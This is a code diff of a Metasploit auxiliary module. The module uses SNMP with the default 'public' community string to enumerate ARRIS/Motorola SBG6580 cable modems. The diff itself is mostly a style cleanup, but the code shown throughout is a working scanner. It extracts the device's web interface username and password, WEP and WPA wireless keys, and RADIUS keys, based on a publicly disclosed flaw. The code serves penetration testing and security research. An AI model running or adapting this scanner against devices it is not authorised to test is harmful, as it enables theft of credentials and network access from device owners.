@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,38 +7,36 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',
-      'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola
-        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username
-        and password for the device user interface as well as wireless network keys
-        and information.
-        The default community used is "public".',
-      'References'  =>
-        [
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/May/79' ],
-          [ 'URL', 'http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],
-          [ 'OSVDB', '110555' ]
-        ],
-      'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',
-      'License'     => MSF_LICENSE
-    ))
+                      'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',
+                      'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola
+                        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username
+                        and password for the device user interface as well as wireless network keys
+                        and information.
+                        The default community used is "public".',
+                      'References'  =>
+                        [
+                          [ 'URL', 'http://seclists.org/fulldisclosure/2014/May/79' ],
+                          [ 'URL', 'http://www.arrisi.com/modems/datasheet/SBG6580/SBG6580_UserGuide.pdf' ],
+                          [ 'OSVDB', '110555' ]
+                        ],
+                      'Author'      => 'Matthew Kienow <mkienow[at]inokii.com>',
+                      'License'     => MSF_LICENSE))
 
     # change SNMP version option to match device specification
     register_options(
       [
         OptString.new('VERSION', [ true, 'SNMP Version <1/2c>', '2c' ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
-
     begin
       snmp = connect_snmp
 
@@ -50,10 +49,10 @@ class MetasploitModule < Msf::Auxiliary
         "RADIUS Server", "RADIUS Port", "RADIUS Key"
       ]
 
-      output_data = {"Host IP" => ip}
+      output_data = { "Host IP" => ip }
 
       sys_descr = snmp.get_value('sysDescr.0')
-      if is_valid_snmp_value(sys_descr) and sys_descr.to_s =~ /SBG6580/
+      if is_valid_snmp_value(sys_descr) && sys_descr.to_s =~ /SBG6580/
         # print connected status after the first query so if there are
         # any timeout or connectivity errors; the code would already
         # have jumped to error handling where the error status is
@@ -65,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
         # basic management objects for the Portal Services (PS) logical element
         # of a CableHome compliant Residential Gateway device
         device_ui_selection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0')
-        if is_valid_snmp_value(device_ui_selection) and device_ui_selection.to_i == 1
+        if is_valid_snmp_value(device_ui_selection) && (device_ui_selection.to_i == 1)
           # manufacturerLocal(1) - indicates Portal Services is using the vendor
           # web user interface shipped with the device
           device_ui_username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')
@@ -85,9 +84,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         ssid = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.#{wifi_ifindex}")
-        if is_valid_snmp_value(ssid)
-          output_data["SSID"] = ssid.to_s
-        end
+        output_data["SSID"] = ssid.to_s if is_valid_snmp_value(ssid)
 
         wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0')
         if is_valid_snmp_value(wireless_band)
@@ -110,11 +107,11 @@ class MetasploitModule < Msf::Auxiliary
           end
 
           wep_encryption = snmp.get_value("1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.#{wifi_ifindex}")
-          if is_valid_snmp_value(wep_encryption)
-            wep_encryption = wep_encryption.to_i
-          else
-            wep_encryption = -1
-          end
+          wep_encryption = if is_valid_snmp_value(wep_encryption)
+                             wep_encryption.to_i
+                           else
+                             -1
+                           end
 
           wep_encryption_name = "Unknown"
           wep_key1 = wep_key2 = wep_key3 = wep_key4 = nil
@@ -179,29 +176,25 @@ class MetasploitModule < Msf::Auxiliary
         print_line("")
         print_status("Device information:\n")
         line = ""
-        width = 30  # name field width
+        width = 30 # name field width
 
-        fields_order.each {|k|
-          if not output_data.has_key?(k)
-            next
-          end
+        fields_order.each do |k|
+          next unless output_data.key?(k)
 
           v = output_data[k]
-          if (v.nil? or v.empty? or v =~ /Null/)
-            v = '-'
-          end
+          v = '-' if v.nil? || v.empty? || v =~ /Null/
 
           report_note(
-            :host  => ip,
-            :proto => 'udp',
-            :sname => 'snmp',
-            :port  => datastore['RPORT'].to_i,
-            :type  => "snmp.#{k}",
-            :data  => v
+            host: ip,
+            proto: 'udp',
+            sname: 'snmp',
+            port: datastore['RPORT'].to_i,
+            type: "snmp.#{k}",
+            data: v
           )
 
-          line << sprintf("%s%s: %s\n", k, " "*([0,width-k.length].max), v)
-        }
+          line << sprintf("%s%s: %s\n", k, " " * [0, width - k.length].max, v)
+        end
 
         print_line(line)
       else
@@ -217,7 +210,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue SNMP::UnsupportedVersion
       print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
     rescue ::Interrupt
-      raise $!
+      raise $ERROR_INFO
     rescue ::Exception => e
       print_error("Unknown error: #{e.class} #{e}")
       elog("Unknown error: #{e.class} #{e}")
@@ -233,8 +226,8 @@ class MetasploitModule < Msf::Auxiliary
     # interface where ifType is 71 (ieee80211) and ifAdminStatus is 1 (up).
     wifi_ifindex = 0
     ifTable_columns = ["ifIndex", "ifDescr", "ifType", "ifAdminStatus"]
-    snmp.walk(ifTable_columns) do |ifIndex, ifDescr, ifType, ifAdminStatus|
-      if (wifi_ifindex < 1 and ifType.value == 71 and ifAdminStatus.value == 1)
+    snmp.walk(ifTable_columns) do |ifIndex, _ifDescr, ifType, ifAdminStatus|
+      if wifi_ifindex < 1 && (ifType.value == 71) && (ifAdminStatus.value == 1)
         wifi_ifindex = ifIndex.value.to_i
       end
     end
@@ -242,10 +235,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def is_valid_snmp_value(value)
-    if value.nil? or value.to_s =~ /Null/ or value.to_s =~ /^noSuch/
+    if value.nil? || value.to_s =~ /Null/ || value.to_s =~ /^noSuch/
       return false
     end
-    return true
+    true
   end
 
   def get_network_auth_mode_name(network_auth_mode)
@@ -311,5 +304,4 @@ class MetasploitModule < Msf::Auxiliary
       output_data["RADIUS Key"] = radius_key.to_s
     end
   end
-
 end
